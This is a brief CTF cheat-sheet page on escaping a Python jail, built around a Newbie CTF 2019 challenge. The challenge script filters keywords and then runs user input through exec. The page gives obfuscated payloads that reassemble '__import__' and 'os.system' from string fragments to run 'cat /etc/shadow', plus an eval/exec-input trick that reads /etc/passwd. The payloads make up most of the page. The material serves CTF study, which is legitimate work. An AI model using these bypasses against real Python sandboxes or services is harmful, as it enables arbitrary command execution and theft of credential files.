# Python Jails Escape

If we faced the Python script as follow, we cannot use common modules used for escalating privileges (**"os", "system", etc.**).\
It appeared in **Newbie CTF 2019**.

```shellscript
#! /usr/bin/python3
def main():
    text = input('>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("No!!!")
            return
        else:
            exec(text)

if __name__ == "__main__":
    main()
```

We need to modify module names to allow us to execute them.\
[This post](https://dspyt.com/how-to-python-jail-escape-newbie-ctf-2019) explains in details.

### Payloads <a href="#payloads" id="payloads"></a>

```shellscript
print(globals())
print(getattr(getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat /etc/shadow'))
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /etc/shadow')
```

### Payloads (input) <a href="#payloads-input" id="payloads-input"></a>

If the **"eval"** or **"exec"** modules are accepted, we can input arbitrary code.

```shellscript
eval(input())
# or
exec(input())

> print(open("/etc/passwd", "r").read())
```

### References <a href="#references" id="references"></a>

* [DSPYT](https://dspyt.com/how-to-python-jail-escape-newbie-ctf-2019)
